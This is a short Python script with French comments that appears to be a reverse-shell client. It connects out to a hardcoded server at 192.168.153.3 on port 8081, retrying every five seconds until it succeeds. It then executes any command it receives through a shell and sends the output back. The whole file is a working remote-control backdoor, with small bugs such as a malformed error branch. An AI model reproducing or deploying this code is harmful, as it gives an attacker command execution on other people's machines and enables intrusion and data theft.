from copy import error
import os
import socket
import time
from time import sleep
import subprocess

PORT = 8081
IP = '192.168.153.3'


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# tentative de connexion au sever, si impossible recommence
while 1:
    try:
        s.connect((IP, PORT))
    except ConnectionError:
        print("Connexion au server impossible...")
        time.sleep(5)
        continue
    
    print("Connected at server!!")
    break


while 1:

    response = s.recv(1024).decode()
    
    if response != "":
                response_list = response.split()
                print("RECU", response_list)
                
                # si la commande est un "cd"
                if len(response_list) == 2 and response_list[0] == "cd":
                    os.chdir(response_list[1])
                    response_list = ["pwd"]
                    print("result" , response_list)
                
                
                try:
                    result = subprocess.run(response_list, shell=True, capture_output=True, text=True, )
                    
                    # si il le canal stdrerr (erreur) n'est pas vide
                    if result.stderr != "":
                        to_serv = result.stdout + "\n\nERREUR: " + result.stderr
                    else: 
                        to_serv = result.stdout
                except:
                    to_serv = "ERREUR INNATTENDU",  error

    print("ENVOIE TO SERVV: " + to_serv)
    s.sendall(to_serv.encode())